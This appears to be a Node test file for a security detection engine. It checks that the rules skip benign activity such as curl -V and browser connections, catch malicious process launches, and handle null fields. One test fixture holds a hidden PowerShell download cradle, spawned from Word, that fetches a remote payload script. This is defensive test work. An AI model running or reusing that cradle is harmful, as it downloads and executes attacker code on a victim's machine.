import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { DetectionEngine } from "../engine";
import { evaluateNetworkRules } from "../network/rules";
import type { SecurityEvent, NetworkViewEvent } from "../types";

describe("ARGUS Detection Rules Quality & False-Positive Prevention", () => {
  it("does NOT flag routine developer curl/wget commands as download-and-execute", () => {
    const engine = new DetectionEngine();
    const benignCurlEvent: any = {
      id: "evt-curl-1",
      event_type: "PROCESS_STARTED",
      type: "PROCESS_CREATED",
      origin: "created",
      timestamp: new Date().toISOString(),
      source: "windows_process_monitor",
      hostname: "TEST-HOST",
      pid: 3001,
      process_name: "curl.exe",
      executable_path: "C:\\Program Files\\curl\\curl.exe",
      command_line: "curl -V",
      parent_pid: 1000,
      parent_process_name: "cmd.exe",
    };

    const detections = engine.ingestEvent(benignCurlEvent);
    const downloadExecDetections = detections.filter((d) => d.rule_id === "PROC-006-DOWNLOAD-EXECUTE");
    assert.equal(downloadExecDetections.length, 0, "Standalone curl -V should NOT trigger PROC-006");
  });

  it("flags suspicious PowerShell download cradle", () => {
    const engine = new DetectionEngine();
    const cradleEvent: any = {
      id: "evt-ps-cradle",
      event_type: "PROCESS_STARTED",
      type: "PROCESS_CREATED",
      origin: "created",
      timestamp: new Date().toISOString(),
      source: "windows_process_monitor",
      hostname: "TEST-HOST",
      pid: 3002,
      process_name: "powershell.exe",
      executable_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      command_line: "powershell.exe -nop -w hidden (New-Object Net.WebClient).DownloadString('http://10.0.2.15/payload.ps1')",
      parent_pid: 1000,
      parent_process_name: "winword.exe",
    };

    const detections = engine.ingestEvent(cradleEvent);
    const firedRules = detections.map((d) => d.rule_id);
    assert.ok(firedRules.includes("PROC-001-SUSPICIOUS-PARENT-CHILD"), "Should trigger PROC-001");
    assert.ok(firedRules.includes("PROC-006-DOWNLOAD-EXECUTE"), "Should trigger PROC-006");
  });

  it("does NOT flag web browser remote connections as scanning/fan-out (NET-007)", () => {
    const engine = new DetectionEngine();
    const browserFanOutEvent: NetworkViewEvent = {
      id: "net-fan-chrome",
      type: "NETWORK_CONNECTION",
      origin: "snapshot",
      timestamp: new Date().toISOString(),
      source: "windows_network_monitor",
      hostname: "TEST-HOST",
      pid: 4001,
      process_name: "chrome.exe",
      executable_path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      metadata: { stableKey: "fan:4001", fanOut: 25, remoteIps: ["1.1.1.1", "8.8.8.8"] },
    };

    const detections = engine["evaluateMatches"](
      browserFanOutEvent,
      evaluateNetworkRules(browserFanOutEvent)
    );
    const fanOutDetections = detections.filter((d) => d.rule_id === "NET-007-REMOTE-FAN-OUT");
    assert.equal(fanOutDetections.length, 0, "Chrome browser fan-out should NOT trigger NET-007 scanning rule");
  });

  it("handles missing/null command lines gracefully without throwing errors", () => {
    const engine = new DetectionEngine();
    const malformedEvent: any = {
      id: "evt-null-cmd",
      event_type: "PROCESS_STARTED",
      type: "PROCESS_CREATED",
      origin: "created",
      timestamp: new Date().toISOString(),
      source: "windows_process_monitor",
      hostname: null,
      pid: 5001,
      process_name: "powershell.exe",
      executable_path: null,
      command_line: null,
      parent_pid: undefined,
      parent_process_name: undefined,
    };

    assert.doesNotThrow(() => {
      const detections = engine.ingestEvent(malformedEvent);
      assert.ok(Array.isArray(detections));
    });
  });
});
